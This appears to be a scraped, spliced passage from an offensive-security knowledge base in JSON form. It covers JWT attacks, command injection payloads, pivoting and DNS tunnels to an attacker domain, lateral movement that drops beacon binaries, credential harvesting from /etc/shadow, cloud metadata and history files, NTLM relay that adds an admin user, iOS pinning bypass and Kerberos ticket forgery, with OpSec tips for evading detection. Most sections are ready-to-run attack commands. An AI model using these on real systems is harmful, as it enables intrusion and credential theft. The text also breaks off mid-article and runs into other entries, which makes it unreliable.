Attacks\n\n```bash\n# None algorithm attack\njwt_tool TOKEN -X a\n\n# Algorithm confusion (RS256 to HS256 — sign with public key as HMAC secret)\njwt_tool TOKEN -X k -pk public.pem\n\n# Weak secret brute force\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# kid parameter path traversal\njwt_tool TOKEN -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\n```\n\n## IDOR and Authorization Flaws\n\n**BOLA (Broken Object Level Authorization)**: Change resource IDs in API requests to access other users' data. Test sequential IDs, UUIDs (enumerate via other endpoints), and encoded/hashed IDs.\n\n**BFLA (Broken Function Level Authorization)**: Access admin endpoints as regular user, change HTTP methods (GET to PUT/DELETE), modify role parameters in request body.\n\n## Command Injection\n\n```bash\n# Basic\n; id\n| id\n`id`\n$(id)\n\n# Blind (time-based)\n; sleep 5\n| ping -c 5 127.0.0.1\n\n# Filter bypass\n;{cat,/etc/passwd}\n;cat${IFS}/etc/passwd\n;cat$IFS/etc/passwd\n```\n\n## OpSec Notes\n\n- Use targeted payloads rather than automated scanners to minimize log footprint\n- Test injection payloads in a lab replica before targeting production\n- SSRF exploitation against metadata services may trigger cloud security alerts\n- Deserialization exploits may crash the application — verify stability first\n- Always capture evidence (screenshots, request/response) for the engagement report\n\n---\n\n## High-Impact CVE Examples\n\n### Log4Shell (CVE-2021-44228)\n\nRemote code execution "pivoting-tunneling": {"slug": "pivoting-tunneling", "title": "Pivoting & Tunneling", "category": "Lateral Movement", "content": "# Pivoting & Tunneling\n\nTechniques for routing traffic through compromised hosts to reach internal networks not directly accessible from the attacker's position.\n\n## SSH Tunneling\n\nThe most versatile and commonly available tunneling method:\n\n```bash\n# Local port forward — access remote_target:port via localhost:local_port\nssh -L 8080:internal_target:80 user@pivot_host\n# Now: curl http://localhost:8080 reaches internal_target:80\n\n# Remote port forward — expose attacker's port through pivot\nssh -R 9090:localhost:4444 user@pivot_host\n# Now: connections to pivot_host:9090 reach attacker:4444\n\n# Dynamic SOCKS proxy — route any traffic through pivot\nssh -D 1080 user@pivot_host\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn internal_target\n\n# SSH over non-standard port with key auth\nssh -i key -p 2222 -D 1080 -N -f user@pivot_host\n# -N: no command, -f: background\n```\n\n**sshuttle** provides transparent VPN-like access without SOCKS configuration:\n```bash\nsshuttle -r user@pivot_host 10.0.0.0/24 172.16.0.0/16\n# All traffic to those subnets automatically routes through pivot_host\n```\n\n## Chisel\n\nFast TCP/UDP tunneling over HTTP with SOCKS5 support:\n\n```bash\n# On attacker (server mode)\nchisel server -p 8080 --reverse\n\n# On pivot host (client mode — reverse SOCKS proxy)\nchisel client attacker_ip:8080 R:socks\n\n# This creates SOCKS5 proxy on attacker:1080\n# Configure proxychains: socks5 127.0.0.1 1080\n\n# TCP port forward (specific port)\nchisel client attacker_ip:8080 R:3389:internal_rdp:3389\n```\n\nChisel is a single binary, works on Windows/Linux/macOS, and wraps traffic in HTTP/WebSocket which is less likely to be blocked by egress filtering.\n\n## Ligolo-ng\n\nCreates a TUN interface — no proxychains needed, fully transparent:\n\n```bash\n# On attacker\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nligolo-proxy -selfcert -laddr 0.0.0.0:11601\n\n# On pivot host (agent)\nligolo-agent -connect attacker_ip:11601 -ignore-cert\n\n# In ligolo proxy console:\nsession # select the agent session\nifconfig # view agent network interfaces\nstart # start tunnel\n\n# Add routes on attacker\nsudo ip route add 10.0.0.0/24 dev ligolo\n# Now: nmap, rdp, smb all work directly against 10.0.0.0/24 without proxychains\n```\n\nLigolo-ng is the most operator-friendly pivoting tool — no proxy configuration, all tools work natively.\n\n## Metasploit Pivoting\n\n```\n# Add route through Meterpreter session\nroute add 10.0.0.0/24 \n\n# Start SOCKS proxy\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun -j\n\n# Port forwarding\nportfwd add -l 3389 -p 3389 -r internal_target\n\n# Use with proxychains\nproxychains crackmapexec smb 10.0.0.0/24\n```\n\n## DNS Tunneling\n\nBypasses most firewall rules since DNS (port 53) is almost always allowed:\n\n```bash\n# iodine — IP-over-DNS tunnel\n# On attacker (authoritative DNS for tunnel domain)\niodined -f -c -P password 10.53.53.1 tunnel.attacker.com\n\n# On pivot host\niodine -f -P password tunnel.attacker.com\n# Creates a tun0 interface with IP in 10.53.53.0/24\n\n# dnscat2 — encrypted C2 over DNS\n# Server\ndnscat2-server tunnel.attacker.com\n\n# Client\ndnscat2 tunnel.attacker.com\n```\n\nDNS tunneling is slow (limited by DNS packet size and latency) but extremely effective at bypassing egress filtering.\n\n## ICMP Tunneling\n\n```bash\n# ptunnel-ng — TCP-over-ICMP\n# On attacker\nptunnel-ng -r pivot_host -R 22\n\n# On pivot host\nptunnel-ng\n\n# Then SSH through the ICMP tunnel\nssh -p 2222 user@127.0.0.1\n```\n\nICMP tunneling works when all TCP/UDP egress is blocked but ICMP echo (ping) is allowed.\n\n## Web Shell Tunnels\n\nWhen only HTTP is available (compromised web server):\n\n```bash\n# Neo-reGeorg — SOCKS proxy through web shell\n# Upload tunnel script to web server (PHP/ASP/JSP/ASPX)\npython3 neoreg.py generate -k password\n# Upload tunnel.php to target web server\n\npython3 neoreg.py -k password -u http://target.com/tunnel.php\n# Creates local SOCKS proxy on 127.0.0.1:1080\n```\n\n## frp (Fast Reverse Proxy)\n\n```ini\n# frps.ini (on attacker)\n[common]\nbind_port = 7000\n\n# frpc.ini (on pivot host)\n[common]\nserver_addr = attacker_ip\nserver_port = 7000\n\n[socks5]\ntype = tcp\nremote_port = 1080\nplugin = socks5\n```\n\nfrp supports TCP/UDP forwarding, SOCKS5, and can multiplex multiple tunnels through a single connection.\n\n## Windows-Specific Tunneling\n\n```cmd\n:: plink.exe (PuTTY command-line SSH)\nplink.exe -ssh -l user -pw password -R 9090:127.0.0.1:3389 attacker_ip\n\n:: netsh port proxy (built-in, no tools needed)\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal_target\n\n:: socat equivalent on Windows\n:: Use chisel or plink instead\n```\n\n## Linux Port Forwarding\n\n```bash\n# socat — versatile relay\nsocat TCP-LISTEN:8080,fork TCP:internal_target:80\n\n# iptables DNAT (requires root)\niptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination internal_target:80\niptables -t nat -A POSTROUTING -j MASQUERADE\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n## Double Pivoting\n\nChain pivots through multiple network segments:\n\n```\nAttacker → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Restricted)\n\n# SSH chain\nssh -J user1@pivot1,user2@pivot2 user3@target\n\n# Chisel chain\n# Pivot1: chisel client attacker:8080 R:socks\n# Pivot2 (through proxychains): chisel client pivot1_tunnel:8080 R:socks\n# Stack SOCKS proxies in proxychains.conf\n\n# Ligolo-ng with multiple agents\n# Add routes for each segment through the appropriate agent\n```\n\n## ProxyChains Configuration\n\n```ini\n# /etc/proxychains4.conf\nstrict_chain\nproxy_dns\n\n[ProxyList]\nsocks5 127.0.0.1 1080\n# For double pivot, add second proxy:\n# socks5 127.0.0.1 1081\n```\n\n## OpSec methods.\n\n## PsExec / Impacket\n\nCreates a service on the remote host via SMB, executes the command, then removes the service:\n\n```bash\n# Impacket psexec.py (drops binary, creates service)\npsexec.py target.local/admin:password@10.0.0.5\npsexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\n\n# Impacket smbexec.py (no binary drop — uses cmd.exe via service)\nsmbexec.py target.local/admin:password@10.0.0.5\n\n# SysInternals PsExec\nPsExec.exe \\\\10.0.0.5 -u admin -p password -s cmd.exe\nPsExec.exe \\\\10.0.0.5 -accepteula -s -d C:\\temp\\beacon.exe\n```\n\n**psexec.py** drops a randomly named executable to the ADMIN$ share and creates a Windows service. This generates Event 7045 (service install) and is widely detected.\n\n**smbexec.py** is stealthier as it uses `cmd.exe /Q /c` piped through a service without dropping a binary. Still creates Event 7045.\n\n## WMI Execution\n\n```bash\n# Impacket wmiexec.py (semi-interactive shell via WMI)\nwmiexec.py target.local/admin:password@10.0.0.5\nwmiexec.py -hashes :NTLM_HASH target.local/admin@10.0.0.5\n\n# Native Windows\nwmic /node:10.0.0.5 /user:admin /password:password process call create \"cmd.exe /c whoami > C:\\temp\\output.txt\"\n\n# PowerShell via WMI\nInvoke-WmiMethod -Computer 10.0.0.5 -Credential $cred -Class Win32_Process -Name Create -ArgumentList \"powershell -ep bypass -e BASE64\"\n```\n\nWMI execution does not create a service — it spawns processes under `WmiPrvSE.exe`. Generates Event 4648 (explicit credential logon) and WMI event logs.\n\n## WinRM\n\n```bash\n# Evil-WinRM (full featured — file upload/download, DLL loading, AMSI bypass)\nevil-winrm -i 10.0.0.5 -u admin -p password\nevil-winrm -i 10.0.0.5 -u admin -H NTLM_HASH\n\n# PowerShell remoting\nEnter-PSSession -ComputerName 10.0.0.5 -Credential $cred\nInvoke-Command -ComputerName 10.0.0.5 -Credential $cred -ScriptBlock { whoami }\n\n# winrs.exe (native Windows)\nwinrs -r:10.0.0.5 -u:admin -p:password cmd.exe\n```\n\nWinRM uses port 5985 (HTTP) or 5986 (HTTPS). Processes spawn under `wsmprovhost.exe`. Requires the target to have WinRM enabled (default on Server 2012+).\n\n## RDP\n\n```bash\n# xfreerdp\nxfreerdp /v:10.0.0.5 /u:admin /p:password /dynamic-resolution\n\n# Restricted Admin Mode (pass-the-hash via RDP — no password needed)\n# Must be enabled on target: reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0\nxfreerdp /v:10.0.0.5 /u:admin /pth:NTLM_HASH /restricted-admin\n\n# SharpRDP (command execution via RDP without full GUI session)\nSharpRDP.exe computername=10.0.0.5 command=\"C:\\temp\\beacon.exe\" username=admin password=password\n```\n\nRDP creates a full interactive session. Generates Event 4624 (Type 10 RemoteInteractive logon). Session is visible to users (unless using shadow session or disconnecting existing sessions).\n\n## DCOM Lateral Movement\n\nAbuse COM objects that support remote instantiation:\n\n```powershell\n# MMC20.Application\n$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.0.0.5\"))\n$com.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c C:\\temp\\beacon.exe\",\"7\")\n\n# ShellBrowserWindow\n$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"10.0.0.5\"))\n$com.Document.Application.ShellExecute(\"cmd.exe\",\"/c payload.exe\",\"C:\\temp\",\"\",0)\n\n# ShellWindows\n$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"10.0.0.5\"))\n$com.item().Document.Application.ShellExecute(\"cmd.exe\",\"/c payload.exe\",\"\",\"\",0)\n```\n\nDCOM uses port 135 (RPC) + dynamic high ports. Less commonly monitored than SMB/WMI.\n\n## Scheduled Tasks\n\n```cmd\n:: Remote scheduled task creation\nschtasks /create /S 10.0.0.5 /U admin /P password /TN \"Update\" /TR \"C:\\temp\\beacon.exe\" backdoor binPath= \"cmd.exe /c C:\\temp\\beacon.exe\" start= auto\nsc \\\\10.0.0.5 start backdoor\nsc \\\\10.0.0.5 delete backdoor\n```\n\n## CrackMapExec (Multi-Protocol)\n\n```bash\n# SMB Artifacts | Port |\n|--------|-------------|-----------|------|\n| PsExec | High | Service install, binary drop | 445 |\n| smbexec | Medium | Service install (no binary) | 445 |\n| WMI | Low-Medium | WMI event log | 135+dynamic |\n| WinRM | Low | PowerShell logging | 5985/5986 |\n| DCOM | Low | Minimal logging | 135+dynamic |\n| Sched Task | Medium | Task creation event | 445 |\n| RDP | High | Full session, screenshot | 3389 |\n\nPrefer WMI or DCOM for quiet lateral movement. WinRM is good when PowerShell logging is not forwarded. Crack with John:\n```bash\nssh2john id_rsa > id_rsa.hash\njohn --wordlist=rockyou.txt id_rsa.hash\n```\n\n## History Files\n\n```bash\n# Shell history\ncat ~/.bash_history ~/.zsh_history /home/*/.bash_history 2>/dev/null\n\n# Application-specific history\ncat ~/.mysql_history ~/.psql_history ~/.python_history ~/.node_repl_history 2>/dev/null\ncat ~/.redis-cli-history 2>/dev/null\n\n# Look for passwords passed as arguments\ngrep -iE 'pass|pwd|secret|token|key|mysql.*-p|ssh.*@|curl.*-u' ~/.bash_history 2>/dev/null\n```\n\nHistory files frequently contain database passwords (`mysql -u root -p'password'`), SSH commands with key paths, curl commands with API tokens, and other sensitive data.\n\n## Configuration Files\n\n```bash\n# Web application configs\nfind / -name \"wp-config.php\" -o -name \".env\" -o -name \"database.yml\" -o -name \"settings.py\" \\\n -o -name \"config.php\" -o -name \"db.php\" -o -name \"application.properties\" 2>/dev/null\n\n# Common credential locations\ncat /var/www/*/wp-config.php 2>/dev/null # WordPress DB creds\ncat /var/www/*/.env 2>/dev/null # Laravel/Node.js secrets\ncat /opt/*/config/database.yml 2>/dev/null # Rails DB config\ncat /etc/shadow 2>/dev/null # System password hashes\n\n# Version control credentials\ncat ~/.git-credentials 2>/dev/null\ncat ~/.gitconfig 2>/dev/null\nfind / -name \".git\" -type d 2>/dev/null # Git repos may contain secrets in history\n\n# Network credentials\ncat ~/.netrc 2>/dev/null # FTP/HTTP credentials\ncat ~/.pgpass 2>/dev/null # PostgreSQL passwords\ncat /etc/my.cnf ~/.my.cnf 2>/dev/null # MySQL credentials\ncat /etc/redis/redis.conf 2>/dev/null | grep requirepass\n```\n\n## Process Memory and Environment\n\n```bash\n# Read environment variables of running processes (requires same user or root)\ncat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|token|key|api'\n\n# List processes with command-line arguments\nps auxww | grep -iE 'pass|pwd|secret|token'\n\n# Process memory dumping (requires ptrace capability or same UID)\n# Find process memory maps\ncat /proc//maps\n# Dump heap regions\ngdb -p -batch -ex 'dump memory /tmp/heap.bin 0xADDR1 0xADDR2'\n# Search dump for strings\nstrings /tmp/heap.bin | grep -iE 'password|token|secret'\n```\n\n## Kernel Keyring\n\n```bash\n# List keys in the kernel keyring\nkeyctl show\nkeyctl read \nkeyctl print \n\n# Session keyring may contain credentials used by applications\ncat /proc/keys 2>/dev/null\n```\n\n## Cloud Credentials\n\n```bash\n# AWS\ncat ~/.aws/credentials ~/.aws/config 2>/dev/null\nenv | grep AWS\n\n# Azure\ncat ~/.azure/accessTokens.json ~/.azure/azureProfile.json 2>/dev/null\n\n# GCP\ncat ~/.config/gcloud/credentials.db ~/.config/gcloud/application_default_credentials.json 2>/dev/null\n\n# Instance metadata (from cloud VMs)\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null\ncurl -s -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" 2>/dev/null\n\n# Kubernetes service account tokens\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null\ncat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null\n```\n\n## /etc/shadow Cracking\n\n```bash\n# If readable (misconfiguration or root access)\n# Combine with /etc/passwd for John\nunshadow /etc/passwd /etc/shadow > combined.txt\njohn --wordlist=rockyou.txt combined.txt\nhashcat -m 1800 shadow_hashes.txt rockyou.txt # AWS access key pattern\nfind / -name \"*.kdbx\" -o -name \"*.keypass\" -o -name \"vault.json\" 2>/dev/null\n```\n\n## OpSec Notes\n\n- Reading /proc/PID/environ for other users' processes requires root or ptrace capability\n- Accessing .bash_history for other users requires either root or file permission misconfiguration\n- Cloud metadata queries are logged in cloud audit trails\n- gdb attachment triggers ptrace syscall which may be monitored\n- Prefer targeted searches over broad filesystem scans to reduce noise\n- Process memory dumping generates significant disk I/O — use tmpfs when possible\n\n---\n\n## Kerberos Keytab Files\n\n```bash\n# Keytab files contain Kerberos long-term keys (equivalent to password hashes)\nfind / -name \"*.keytab\" 2>/dev/null\nfind / -name \"krb5.keytab\" 2>/dev/null\nls -la /etc/krb5.keytab # system keytab (machine account)\n\n# Common locations:\n# /etc/krb5.keytab — machine account (readable only by root usually)\n# ~/user.keytab — user keytab for passwordless kinit\n# /opt/app/service.keytab — service account keytab\n\n# Use keytab to authenticate (if readable)\nkinit -k -t /path/to/service.keytab service@CORP.LOCAL\nklist # "category": "Mobile", "content": "# iOS Security Testing\n\niOS's closed ecosystem, code signing enforcement, and hardware security features make it one of the most secure mobile platforms. Testing requires jailbreaking or supervised MDM access for most dynamic analysis.\n\n## iOS Security Model\n\n```\nSecurity layers:\n1. Secure Enclave — dedicated security processor (keys, Touch/Face ID)\n2. Code Signing — all executables must be signed by Apple/enterprise cert\n3. Sandboxing — apps isolated via MAC (TrustedBSD)\n4. Data Protection — per-file encryption classes tied to lock state\n5. Keychain — encrypted credential storage (ACL-controlled)\n6. ASLR + PIE — all processes randomized\n7. Pointer Authentication (PAC) — A12+ chips\n8. Memory Tagging (MTE) — A17+ chips\n```\n\n---\n\n## Jailbreaking\n\nJailbreaking removes code signing enforcement and installs Cydia/Sileo package manager:\n\n| Tool | iOS Version | Chip | Type |\n|------|------------|------|------|\n| checkra1n | iOS 12–14.8.1 | A5–A11 | Semi-tethered, bootrom |\n| palera1n | iOS 15–17.x | A8–A11 | Semi-tethered, bootrom |\n| Dopamine | iOS 15–16.6.1 | A12+ | Semi-untethered, kernel |\n| Fugu15 Max | iOS 15.x | A12+ | Semi-untethered |\n| unc0ver | iOS 11–14.8 | A12+ | Semi-untethered |\n\n```bash\n# palera1n (Linux/macOS)\ngit clone https://github.com/palera1n/palera1n\ncd palera1n && ./palera1n -c -v # rootful jailbreak\n\n# checkra1n (macOS/Linux)\n# GUI app: drag to Applications, open, follow steps\n# CLI: checkra1n -c (channel mode) or checkra1n --cli\n\n# After jailbreak: install OpenSSH\n# Cydia → OpenSSH → Install\n\n# SSH into device\nssh root@ # default password: alpine (change immediately!)\n```\n\n---\n\n## Frida on iOS\n\n```bash\n# Install Frida via Cydia/Sileo:\n# Add repo: https://build.frida.re → install Frida\n\n# From PC:\nfrida-ps -U # list processes\nfrida -U -n \"TargetApp\" -l script.js\n\n# SSL Kill Switch 2 (Cydia tweak alternative to Frida SSL bypass)\n# Repo: julioverne.github.io → install SSL Kill Switch 2\n# Kills: NSURLSession, NSURLConnection, AFNetworking, Alamofire pinning\n\n# Frida SSL bypass for iOS\n# script.js:\n# (use SSL-Kill-Switch-Frida or custom implementation)\n```\n\n```javascript\n// iOS SSL pinning bypass (Frida)\nvar SecurityFramework = Module.load('/System/Library/Frameworks/Security.framework/Security');\nvar SSLSetSessionOption = new NativeFunction(\n SecurityFramework.getExportByName('SSLSetSessionOption'), 'int', ['pointer', 'int', 'bool']\n);\n\n// Hook SecTrustEvaluate\nInterceptor.replace(Module.findExportByName('Security', 'SecTrustEvaluate'),\n new NativeCallback(function(trust, result) {\n // Set result to kSecTrustResultProceed\n Memory.writeU32(result, 1);\n return 0; This blind spot enables powerful credential capture and MITM attacks in Active Directory environments.\n\n## IPv6 Fundamentals for Attackers\n\n```\nKey IPv6 concepts:\n- Link-local: fe80::/10 — auto-assigned, no DHCP needed\n- SLAAC: Stateless Address Autoconfiguration — hosts configure themselves via Router Advertisements\n- DHCPv6: Stateful address assignment (like DHCPv4)\n- NDP: Neighbor Discovery Protocol — replaces ARP (ICMPv6 types 133-137)\n- Router Advertisement (RA): type 134 — configures default gateway + DNS for hosts\n- Router Solicitation (RS): type 133 — hosts request RA from routers\n- Neighbor Solicitation (NS): type 135 — replaces ARP request\n- Neighbor Advertisement (NA): type 136 — replaces ARP reply\n\nCritical: Windows prefers IPv6 over IPv4 by default (RFC 3484)\n→ Rogue IPv6 DNS server takes priority over IPv4 DNS\n```\n\n---\n\n## mitm6 — DHCPv6 DNS Takeover\n\nmitm6 sends rogue Router Advertisements and DHCPv6 replies to assign itself as the IPv6 DNS server for all Windows hosts. Windows then uses the attacker's DNS for name resolution — enabling NTLM relay via WPAD or direct credential capture.\n\n```bash\n# Install\npip3 install mitm6\n# or: git clone https://github.com/dirkjanm/mitm6 && pip3 install -r requirements.txt\n\n# Basic attack (targets all hosts in domain)\nsudo mitm6 -d corp.local\n\n# Target specific subnet\nsudo mitm6 -d corp.local -i eth0\n\n# Whitelist specific hosts only\nsudo mitm6 -d corp.local --host-whitelist 192.168.1.0/24\n\n# What mitm6 does:\n# 1. Listens for DHCPv6 solicitations from Windows hosts\n# 2. Assigns link-local IPv6 address to victim\n# 3. Sets attacker as IPv6 DNS server (highest priority)\n# 4. Victims resolve hostnames via attacker's DNS\n# 5. Attacker responds with WPAD or SMB URLs → NTLM relay\n```\n\n---\n\n## mitm6 + ntlmrelayx (AD Credential Capture)\n\nThe most powerful combination — capture NTLMv2 hashes from all hosts that make DNS queries, then relay to LDAP/LDAPS for account creation or shadow credentials:\n\n```bash\n# Terminal 1: Start ntlmrelayx targeting LDAP on DC\nimpacket-ntlmrelayx -6 -t ldaps://192.168.1.10 \\\n --delegate-access \\\n --add-computer EVILPC \\\n -wh attacker-wpad.corp.local \\\n -l /tmp/loot\n\n# Terminal 2: Start mitm6\nsudo mitm6 -d corp.local\n\n# What happens:\n# 1. mitm6 → victims get attacker IPv6 DNS\n# 2. Victims query \"wpad.corp.local\" for proxy config\n# 3. ntlmrelayx serves fake WPAD (requests NTLM auth)\n# 4. Victims authenticate → NTLM relayed to LDAPS on DC\n# 5. With --delegate-access: creates machine account + sets RBCD\n# 6. Attacker can then impersonate any user to victim machine\n\n# Alternative: relay to SMB for command execution\nimpacket-ntlmrelayx -6 -t smb://192.168.1.20 -smb2support -c \"net user hacker P@ss123! /add && net localgroup administrators hacker /add\"\n\n# Relay to LDAP for user enumeration/modification\nimpacket-ntlmrelayx -6 -t ldap://192.168.1.10 -wh attacker-wpad.corp.local --dump-laps\n```\n\n---\n\n## Rogue Router Advertisement (RA) Attack\n\nSend forged RA packets to become the default IPv6 gateway for all hosts:\n\n```bash\n# THC-IPv6 toolkit\nsudo apt install thc-ipv6 -y\n\n# Send rogue RA (become default gateway)\nsudo fake_router6 eth0 fe80::1 # attacker's link-local as gateway\n\n# flood_router6: flood with random RA (DoS — use carefully)\nsudo flood_router6 eth0\n\n# Python with scapy\nfrom scapy.all import *\nfrom scapy.layers.inet6 import *\n\nra = Ether(dst=\"33:33:00:00:00:01\")/IPv6(dst=\"ff02::1\", src=\"fe80::1\")/\\\n ICMPv6ND_RA(M=1, O=1)/\\\n ICMPv6NDOptDNSS(dns=[IPv6Address(\"fe80::1\")])/\\\n ICMPv6NDOptPrefixInfo(prefix=\"2001:db8::\", prefixlen=64)\nsendp(ra, iface=\"eth0\", loop=1, inter=5)\n```\n\n---\n\n## IPv6 Scanning\n\nMost organizations have no IPv6 IDS signatures — scanning is often undetected:\n\n```bash\n# nmap IPv6 scan\nnmap -6 -sV fe80::1/64 --interface eth0 # link-local range\nnmap -6 -sV 2001:db8::/32 # routable range\n\n# alive6 (THC-IPv6) — discover live hosts\nsudo alive6 eth0 # ICMPv6 ping all link-local\nsudo alive6 -p eth0 # passive mode\n\n# scan6 (SI6 Networks)\nsudo scan6 -i eth0 -L -e -v # local network scan\nsudo scan6 -i eth0 -d 2001:db8::/64 -v # specific prefix\n\n# ping6 all-nodes multicast\nping6 -c 3 ff02::1%eth0 # all link-local nodes respond\n\n# NDP cache inspection (post-MITM)\nip -6 neigh show\n```\n\n---\n\n## IPv6 Firewall Bypass\n\nMany perimeter firewalls block IPv4 but have no IPv6 rules:\n\n```bash\n# Check if target has IPv6 connectivity\nping6 targetdomain.com\nnmap -6 -p 80,443,22 targetdomain.com\n\n# Common IPv6 tunneling protocols that bypass IPv4 firewalls:\n# 6in4 (protocol 41): tunnel IPv6 in IPv4 packets\n# Teredo (UDP 3544): NAT traversal for IPv6\n# ISATAP: intrasite automatic tunnel addressing protocol\n# 6to4: auto-tunnel (192.88.99.1 anycast relay)\n\n# If target runs Teredo:\nsudo apt install miredo # Teredo client\n# Enables IPv6 even behind NAT — potential tunnel into restricted networks\n\n# Tunnel C2 traffic over IPv6:\n# Many DLP/proxy solutions only inspect IPv4 traffic\n# IPv6 C2 channel bypasses IPv4-only filtering\n```\n\n---\n\n## NDP Spoofing (IPv6 ARP Equivalent)\n\n```bash\n# parasite6: respond to all NDP neighbor solicitations (= ARP spoofing for IPv6)\nsudo parasite6 eth0\n\n# Targeted NDP spoof with scapy\nfrom scapy.all import *\nfrom scapy.layers.inet6 import *\n\ndef ndp_spoof(target_ip6, spoof_ip6, target_mac, iface):\n pkt = Ether(dst=target_mac)/\\\n IPv6(src=spoof_ip6, dst=target_ip6)/\\\n ICMPv6ND_NA(tgt=spoof_ip6, R=0, S=1, O=1)/\\\n ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(iface))\n sendp(pkt, iface=iface, verbose=0)\n```\n\n---\n\n## ADIDNS Abuse via IPv6\n\nActive Directory Integrated DNS allows authenticated users to add DNS records — abuse to redirect traffic:\n\n```bash\n# Add DNS record pointing to attacker (requires domain user creds)\npython3 dnstool.py -u corp.local\\\\user -p pass \\\n -r wpad.corp.local \\\n -d 192.168.1.50 \\\n --action add \\\n 192.168.1.10 # Its ticket-based architecture introduces a rich attack surface — from offline hash cracking to forged tickets granting unlimited domain access.\n\n## Kerberos Protocol Overview\n\n```\n1. AS-REQ → KDC: \"I am user@corp.local, give me a TGT\"\n2. AS-REP ← KDC: TGT (encrypted with krbtgt hash) + session key (encrypted with user hash)\n3. TGS-REQ → KDC: TGT + \"I need access to SPN host/server01\"\n4. TGS-REP ← KDC: Service Ticket (encrypted with service account hash)\n5. AP-REQ → Service: Service Ticket\n6. AP-REP ← Service: Access granted\n```\n\nKey insight: Service tickets encrypted with the **service account's NTLM hash** — crackable offline.\n\n---\n\n## AS-REP Roasting\n\nAccounts with \"Do not require Kerberos preauthentication\" send AS-REP encrypted only with the user's password hash — no authentication needed to request:\n\n```bash\n# Find vulnerable accounts (no preauth)\nimpacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10\nimpacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -request # enumerate all\n\n# PowerView\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname\n\n# Rubeus\n.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n\n# Crack AS-REP hash (-m 18200)\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt -a 3 \"?a?a?a?a?a?a?a?a\"\n```\n\n---\n\n## Kerberoasting\n\nRequest service tickets for any SPN-registered account — ticket encrypted with service account's NTLM hash:\n\n```bash\n# Impacket (from Linux)\nimpacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 -request\nimpacket-GetUserSPNs corp.local/user:password -dc-ip 192.168.1.10 \\\n -outputfile kerberoast.txt\n\n# Rubeus (from Windows)\n.\\Rubeus.exe kerberoast /outfile:tgs.txt\n.\\Rubeus.exe kerberoast /user:svcSQL /outfile:tgs.txt # targeted\n\n# PowerView + Invoke-Kerberoast\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash\n\n# Crack TGS hash (-m 13100)\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerberoast.txt -r /usr/share/hashcat/rules/best64.rule rockyou.txt\n\n# RC4 vs AES: if SPN account supports RC4 (etype 17/18), request RC4:\n.\\Rubeus.exe kerberoast /tgtdeleg /rc4opsec # downgrade to RC4 where possible\n```\n\n---\n\n## Pass-the-Ticket (PtT)\n\nUse captured Kerberos tickets without the original password:\n\n```bash\n# Dump tickets from memory (Windows — requires local admin)\n.\\Mimikatz.exe \"sekurlsa::tickets /export\" exit\n# Creates .kirbi files\n\n# Rubeus: dump all # Linux\n.\\Rubeus.exe klist # Windows\n```\n\n---\n\n## Golden Ticket\n\nForge TGTs using the krbtgt account hash — bypasses all KDC validation:\n\n```bash\n# Prerequisites: krbtgt NTLM hash (from corp.local \\\n -groups 512,519 \\\n FakeAdmin\n\nexport KRB5CCNAME=FakeAdmin.ccache\nimpacket-psexec -k -no-pass FakeAdmin@dc01.corp.local\n\n# Golden Ticket properties:\n# - Valid for 10 years /ticketuser:Administrator /ticketuserrid:500 /groups:512 /nowrap\n\n# Diamond tickets pass PAC validation (real PAC, modified fields)\n# Evades Golden Ticket detections based on anomalous PAC structure\n```\n\n---\n\n## Constrained Delegation Abuse\n\nIf a service account has \"Trust this computer for delegation to specified services\" (constrained delegation), it can impersonate any user "ntlm-relay", "title": "NTLM Relay Attacks", "category": "Network Attacks", "content": "# NTLM Relay Attacks\n\nNTLM relay attacks intercept NTLM authentication challenges and relay them to target services, gaining access without ever cracking the password. They are among the most impactful attacks in Active Directory environments.\n\n## NTLM Authentication Protocol\n\n```\n1. Client → Server: NEGOTIATE_MESSAGE (I support NTLM)\n2. Server → Client: CHALLENGE_MESSAGE (here is my 8-byte nonce)\n3. Client → Server: AUTHENTICATE_MESSAGE (here is HMAC-MD5(NT_hash, nonce))\n\nRelay attack — attacker is in the middle:\n1. Attacker → Target: NEGOTIATE (on behalf of victim)\n2. Target → Attacker: CHALLENGE (nonce from target)\n3. Attacker → Victim: CHALLENGE (same nonce — trick victim into signing for target)\n4. Victim → Attacker: AUTHENTICATE (valid response for target's nonce)\n5. Attacker → Target: AUTHENTICATE (relay victim's response)\n6. Target → Attacker: ACCESS GRANTED as victim\n```\n\n---\n\n## Prerequisites: SMB Signing\n\nSMB relay only works if the target has SMB signing **disabled or not required**:\n\n```bash\n# Check SMB signing across subnet\nnmap --script 